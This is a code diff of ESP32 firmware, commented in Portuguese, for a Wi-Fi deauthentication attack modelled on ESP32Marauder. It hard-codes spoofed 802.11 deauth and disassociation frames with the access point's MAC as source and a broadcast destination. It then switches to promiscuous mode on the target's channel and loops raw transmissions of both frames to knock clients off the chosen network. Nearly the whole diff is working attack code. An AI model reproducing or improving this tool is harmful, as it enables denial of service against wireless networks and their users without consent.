@@ -3,51 +3,35 @@
 #include "config.h"
 
 // ============================================================
-// DEAUTH / DISASSOC FRAMES
+// DEAUTH FRAME - EXATAMENTE como o ESP32Marauder
+// 
+// Frame Control: 0xC0 = Deauth
+// Duration: 0x3A, 0x01 = 314us
+// DA: Broadcast (ff:ff:ff:ff:ff:ff)
+// SA: AP MAC (preenchido em runtime)
+// BSSID: AP MAC (preenchido em runtime)
+// Seq Ctrl: 0xF0, 0xFF = 0xFFF0 (sequence number alto, aceito pelo driver)
+// Reason Code: 0x02, 0x00 = Reason 2 (prev auth expired)
 // ============================================================
-
-// Deauth: AP -> Broadcast
 static uint8_t deauthFrame[26] = {
     0xC0, 0x00,             // Frame Control: Deauth
     0x3A, 0x01,             // Duration
     0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // DA: Broadcast [4]
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // SA: AP MAC [10]
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID: AP MAC [16]
-    0x00, 0x00,             // Seq Ctrl [22] - DRIVER INCREMENTA
-    0x01, 0x00              // Reason: 1 = Unspecified [24]
+    0xF0, 0xFF,             // Seq Ctrl: 0xFFF0 [22]
+    0x02, 0x00              // Reason: 2 = Previous authentication expired [24]
 };
 
-// Deauth: AP -> STA (direcionado)
-static uint8_t deauthFrameToSTA[26] = {
-    0xC0, 0x00,
-    0x3A, 0x01,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // DA: STA MAC [4]
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // SA: AP MAC [10]
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID: AP MAC [16]
-    0x00, 0x00,
-    0x01, 0x00
-};
-
-// Deauth: STA -> AP (reverso)
-static uint8_t deauthFrameFromSTA[26] = {
-    0xC0, 0x00,
-    0x3A, 0x01,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // DA: AP MAC [4]
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // SA: STA MAC [10] 
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID: AP MAC [16]
-    0x00, 0x00,
-    0x01, 0x00
-};
-
-// Disassociation: AP -> Broadcast
+// Disassociation frame
 static uint8_t disassocFrame[26] = {
     0xA0, 0x00,             // Frame Control: Disassociation
     0x3A, 0x01,
     0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00,
-    0x01, 0x00
+    0xF0, 0xFF,
+    0x02, 0x00
 };
 
 // ============================================================
@@ -60,7 +44,6 @@ static uint8_t  deauthTargetBSSID[6] = {0};
 static char     deauthTargetSSID[33] = {0};
 static uint8_t  deauthTargetAuth = 0;
 static uint32_t deauthFailCount = 0;
-static esp_err_t lastDeauthError = ESP_OK;
 
 // ============================================================
 // HELPERS
@@ -75,14 +58,8 @@ void setMAC(uint8_t* frame, uint8_t* mac, int offset) {
 void scanNetworks() {
     networkCount = 0;
 
-    // MODO CRÍTICO: NÃO desconecta completamente!
-    // Apenas garante modo STA - interface deve permanecer ativa
-    if (WiFi.getMode() != WIFI_STA) {
-        WiFi.mode(WIFI_STA);
-    }
-    // NÃO chama WiFi.disconnect(true) aqui - isso invalida a interface!
-    delay(100);
-
+    // NÃO muda modo WiFi aqui! Apenas escaneia.
+    // O WiFi já deve estar em modo STA desde o setup()
     int n = WiFi.scanNetworks(false, true);
     Serial.printf("[WiFi] Scan found %d networks\n", n);
 
@@ -108,7 +85,7 @@ NetworkInfo* getNetwork(uint8_t index) {
 }
 
 // ============================================================
-// DEAUTH
+// DEAUTH - BASEADO NO ESP32MARAUDER + RISINEK
 // ============================================================
 void startDeauth(uint8_t networkIndex) {
     if (networkIndex >= networkCount) {
@@ -118,62 +95,46 @@ void startDeauth(uint8_t networkIndex) {
 
     NetworkInfo* target = &scannedNetworks[networkIndex];
 
+    // Salva info
     memcpy(deauthTargetBSSID, target->bssid, 6);
     strncpy(deauthTargetSSID, target->ssid, 32);
     deauthTargetSSID[32] = '\0';
     deauthTargetChannel = target->channel;
     deauthTargetAuth = target->encrypted ? 1 : 0;
 
-    // Configura frames com MAC do AP
-    setMAC(deauthFrame, target->bssid, 10);
-    setMAC(deauthFrame, target->bssid, 16);
-
-    setMAC(deauthFrameToSTA, target->bssid, 10);
-    setMAC(deauthFrameToSTA, target->bssid, 16);
-
-    setMAC(deauthFrameFromSTA, target->bssid, 4);   // DA = AP
-    setMAC(deauthFrameFromSTA, target->bssid, 16);  // BSSID = AP
-    setMAC(deauthFrameFromSTA, target->bssid, 10);  // SA = AP (spoof)
+    // Preenche frames com MAC do AP
+    setMAC(deauthFrame, target->bssid, 10);  // SA = AP
+    setMAC(deauthFrame, target->bssid, 16);  // BSSID = AP
 
     setMAC(disassocFrame, target->bssid, 10);
     setMAC(disassocFrame, target->bssid, 16);
 
-    // === PREPARA WIFI - ORDEM CRÍTICA ===
-    // 1. Modo STA (interface já deve estar ativa)
+    // === CONFIGURAÇÃO CRÍTICA DO WIFI ===
+    // 1. Modo STA (sem AP ativo)
     WiFi.mode(WIFI_STA);
-    delay(50);
+    delay(100);
 
-    // 2. NÃO desconecta! A interface STA precisa estar "up"
-    //    para esp_wifi_80211_tx funcionar.
-    //    WiFi.disconnect(true) DESTRÓI a interface!
-    //    Apenas garante que não estamos conectados a nenhum AP
-    if (WiFi.status() == WL_CONNECTED) {
-        WiFi.disconnect(false);  // false = não apaga configuração da interface
-        delay(100);
-    }
+    // 2. Desconecta de qualquer AP (mas mantém interface ativa)
+    WiFi.disconnect(false);
+    delay(100);
 
-    // 3. Desliga power save para TX máximo
+    // 3. Promiscuous mode ON (inicializa hardware WiFi para raw TX)
+    esp_err_t promisc_err = esp_wifi_set_promiscuous(true);
+    Serial.printf("[Deauth] Promiscuous: %d\n", promisc_err);
+
+    // 4. Desliga power save
     esp_wifi_set_ps(WIFI_PS_NONE);
 
-    // 4. MUDA PARA O CANAL DO ALVO
+    // 5. MUDA PARA O CANAL DO ALVO (ESSENCIAL!)
     esp_err_t chErr = esp_wifi_set_channel(target->channel, WIFI_SECOND_CHAN_NONE);
-    Serial.printf("[Deauth] Target: %s CH%d MAC:%02X:%02X:%02X:%02X:%02X:%02X\n",
-        target->ssid, target->channel,
-        target->bssid[0], target->bssid[1], target->bssid[2],
-        target->bssid[3], target->bssid[4], target->bssid[5]);
-    Serial.printf("[Deauth] Set channel result: %d\n", chErr);
+    Serial.printf("[Deauth] Target: %s CH%d\n", target->ssid, target->channel);
+    Serial.printf("[Deauth] Set channel: %d\n", chErr);
 
-    // 5. Promiscuous mode APÓS configurar tudo
-    //    (algumas versões do driver precisam disso)
-    esp_wifi_set_promiscuous(true);
-    delay(50);
-
-    // Reseta contadores
+    // 6. Reseta contadores
     deauthActive = true;
     deauthPacketCount = 0;
     deauthSuccessCount = 0;
     deauthFailCount = 0;
-    lastDeauthError = ESP_OK;
 
     Serial.println("[Deauth] STARTED");
 }
@@ -189,55 +150,37 @@ void stopDeauth() {
 }
 
 // ============================================================
-// LOOP DE DEAUTH
+// LOOP DE DEAUTH - SIMPLES E DIRETO (como o Marauder faz)
 // ============================================================
 bool deauthLoop() {
     if (!deauthActive) return false;
 
-    static uint8_t cycle = 0;
     bool anySuccess = false;
-    esp_err_t err = ESP_FAIL;
+    esp_err_t err;
 
-    // Verifica se a interface ainda está válida
-    wifi_mode_t mode;
-    esp_wifi_get_mode(&mode);
-    if (mode != WIFI_MODE_STA) {
-        Serial.printf("[Deauth] WARN: WiFi mode=%d, resetting to STA\n", mode);
-        WiFi.mode(WIFI_STA);
-        delay(50);
-    }
-
-    // Alterna entre 4 tipos de frames
-    switch (cycle % 4) {
-        case 0:
-            err = esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, 26, true);
-            break;
-        case 1:
-            err = esp_wifi_80211_tx(WIFI_IF_STA, deauthFrameToSTA, 26, true);
-            break;
-        case 2:
-            err = esp_wifi_80211_tx(WIFI_IF_STA, deauthFrameFromSTA, 26, true);
-            break;
-        case 3:
-            err = esp_wifi_80211_tx(WIFI_IF_STA, disassocFrame, 26, true);
-            break;
-    }
-    cycle++;
+    // Envia deauth frame
+    // en_sys_seq = false (mantém nosso sequence number 0xFFF0)
+    err = esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, 26, false);
 
     if (err == ESP_OK) {
         deauthSuccessCount++;
         anySuccess = true;
     } else {
-        lastDeauthError = err;
         deauthFailCount++;
-        // Loga erros para debug
-        if (deauthFailCount <= 10 || deauthFailCount % 50 == 0) {
-            Serial.printf("[Deauth] TX ERR cycle=%d err=%d (%s)\n", 
-                cycle % 4, err, 
-                err == ESP_ERR_WIFI_IF ? "invalid interface" :
-                err == ESP_ERR_INVALID_ARG ? "invalid arg" :
-                err == ESP_ERR_WIFI_TIMEOUT ? "timeout" : "unknown");
-        }
+    }
+    deauthPacketCount++;
+
+    // Pequeno delay para não saturar o driver
+    delayMicroseconds(100);
+
+    // Envia disassoc frame
+    err = esp_wifi_80211_tx(WIFI_IF_STA, disassocFrame, 26, false);
+
+    if (err == ESP_OK) {
+        deauthSuccessCount++;
+        anySuccess = true;
+    } else {
+        deauthFailCount++;
     }
     deauthPacketCount++;
 
